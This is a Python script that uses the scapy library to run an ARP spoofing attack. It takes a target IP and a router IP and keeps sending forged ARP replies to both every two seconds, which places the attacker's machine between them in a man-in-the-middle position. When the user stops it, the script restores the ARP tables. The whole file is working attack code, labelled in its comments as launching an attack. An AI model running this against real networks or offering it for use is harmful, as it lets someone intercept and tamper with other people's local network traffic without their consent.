import scapy.all as scapy
import time
import sys
import argparse


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify the target IP")
    parser.add_argument("-r", "--router", dest="router", help="Specify the router's IP")
    options = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify the target IP to spoof. use --help for more info.")

    elif not options.router:
        parser.error("[-] Please specify the router's IP. use --help for more info.")

    else:
        return options


def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    try:
        mac_address = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0][0][1].hwsrc

    except IndexError:
        print("[-] Invalid IP specified. Please try again")
        sys.exit(0)

    return mac_address


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_packet, verbose=False)


# restore ARP tables by giving correct source IP and MAC
def restore_ARP(dest_ip, source_ip):

    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_packet, count=4, verbose=False)

options = get_argument()
target_ip = options.target
router_ip = options.router

sent_packet_count = 0

# launch attack
try:

    while(True): # send spoof packet every 2 seconds

        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)

        sent_packet_count += 2

        print("\r[+] Packets sent: " + str(sent_packet_count)),
        sys.stdout.flush()

        time.sleep(2)

except KeyboardInterrupt: # exit program and restore ARP tables

    print("\n[-] Detected CTRL + C ....... Resetting ARP tables.... Please wait...")

    restore_ARP(target_ip, router_ip)
    restore_ARP(router_ip, target_ip)

    print("[-] ARP tables restored. Exiting program.")
